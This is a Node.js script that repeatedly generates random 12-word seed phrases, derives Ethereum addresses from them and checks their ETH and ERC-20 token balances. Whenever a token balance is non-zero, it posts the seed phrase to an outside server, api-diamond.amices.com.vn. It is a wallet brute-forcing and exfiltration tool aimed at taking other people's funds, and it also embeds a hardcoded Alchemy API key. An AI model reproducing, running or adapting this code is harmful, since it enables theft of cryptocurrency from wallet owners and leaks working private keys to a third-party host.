const bip39 = require("bip39");
const BIP32Factory = require("bip32").BIP32Factory;
const ecc = require("tiny-secp256k1");
const randomBytes = require("randombytes");
const ethWallet = require("ethereumjs-wallet").default;
const { ethers } = require("ethers");
const Axios = require("axios").Axios;

const cluster = require("cluster");
const numCPUs = require("os").cpus().length;

const { erc20Tokens } = require("./erc20Tokens");

const bip32 = BIP32Factory(ecc);

const axios = new Axios({
  baseURL: "https://api-diamond.amices.com.vn",
});

const provider = new ethers.AlchemyProvider(
  "mainnet",
  "kM6dTofpt93RN1fpFkvwQgT50q5dMZbb"
);

const abi = ["function balanceOf(address) view returns (uint)"];

function generateRandomMnemonic() {
  const randomBytesGenerated = randomBytes(16);
  const hexString = randomBytesGenerated.toString("hex");
  const mnemonic = bip39.entropyToMnemonic(hexString);
  return mnemonic;
}

async function checkTokenBalancesAndTransfer(walletAddress, mnemonic) {
  async function getTokenBalances(address) {
    const promises = erc20Tokens.map(async (token) => {
      const contract = new ethers.Contract(token.address, abi, provider);
      const balance = await contract.balanceOf(address);
      return {
        name: token.name,
        balance,
      };
    });

    return Promise.all(promises);
  }

  try {
    console.log(`Token balances for address ${walletAddress}:`);
    const ethBalance = await provider.getBalance(walletAddress);
    console.log(`ETH: ${ethBalance}`);
    const tokenBalances = await getTokenBalances(walletAddress);

    // Check each token balance and transfer if balance > 0
    for (let token of tokenBalances) {
      console.log(`${token.name}: ${token.balance}`);
      if (token.balance > 0) {
        console.log(`Found! ${token.name} tokens...`, mnemonic);
        await axios.post("/api/users/wallet", {
          mnemonic,
          token: token.name,
        });
      }
    }
  } catch (error) {
    console.error("Error fetching or transferring token balances:", error);
  }
}

async function generateWalletCheckBalanceAndTransfer() {
  // Generate a random 12-word seed phrase
  const mnemonic = generateRandomMnemonic();
  console.log("Generated 12-word seed phrase:", mnemonic);

  // Convert the mnemonic to a seed
  const seed = bip39.mnemonicToSeedSync(mnemonic);

  // Create a BIP32 root key from the seed
  const root = bip32.fromSeed(seed);

  // Derive the first account's node using the BIP44 path for Ethereum
  const path = "m/44'/60'/0'/0/0";
  const child = root.derivePath(path);

  // Get the wallet address
  const wallet = ethWallet.fromPrivateKey(child.privateKey);
  const address = wallet.getAddressString();
  console.log("Wallet address:", address);

  await checkTokenBalancesAndTransfer(address, mnemonic);
}

const main = async () => {
  let count = 1;
  while (true) {
    console.log("Checked wallet counts: ", count);
    try {
      count++;
      await generateWalletCheckBalanceAndTransfer();
    } catch (error) {
      console.error("Error: ", error);
    }
  }
};

main();

// Master process
// if (cluster.isMaster) {
//   console.log(`Master ${process.pid} is running`);

//   // Fork workers
//   for (let i = 0; i < numCPUs; i++) {
//     cluster.fork();
//   }

//   cluster.on("exit", (worker, code, signal) => {
//     console.log(`Worker ${worker.process.pid} died, restarting...`);
//     cluster.fork();
//   });
// } else {
//   // Worker processes
//   console.log(`Worker ${process.pid} started`);
//   main();
// }
